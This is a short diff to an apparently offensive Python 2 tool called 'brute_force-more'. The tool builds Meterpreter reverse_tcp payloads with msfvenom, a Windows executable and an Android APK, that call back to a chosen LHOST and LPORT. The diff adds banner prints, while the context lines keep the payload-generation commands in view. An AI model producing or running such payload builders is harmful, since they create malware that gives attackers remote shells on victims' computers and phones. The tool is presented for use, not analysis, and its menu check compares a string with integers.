@@ -35,9 +35,25 @@ values = input('--> ')
 
 if values == 1:
      msfvenom_1 = os.system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o output/{}.exe'.format(LhOsT,lPoRt,Path))
-
+     os.system('clear')
+     print '+++++++++++++++++++++++++++++++++++++++++++++++++'
+     print '|                                               |'
+     print '|  output :  /brute_force-more/output/          |'
+     print '|                                               |'
+     print '|  Reverse : windows/meterpreter/reverse_tcp    |'
+     print '|                                               |'
+     print '+++++++++++++++++++++++++++++++++++++++++++++++++'
+   
 elif values == 2:
      msfvenom_2 = os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={}  LPORT={} R > output/{}.apk'.format(LhOsT,lPoRt,Path))
+     os.system('clear')
+     print '+++++++++++++++++++++++++++++++++++++++++++++++++'
+     print '|                                               |'
+     print '|  output :  /brute_force-more/output/          |'
+     print '|                                               |'
+     print '|  Reverse : android/meterpreter/reverse_tcp    |'
+     print '|                                               |'
+     print '+++++++++++++++++++++++++++++++++++++++++++++++++'
 
 else:
  os.system('clear')
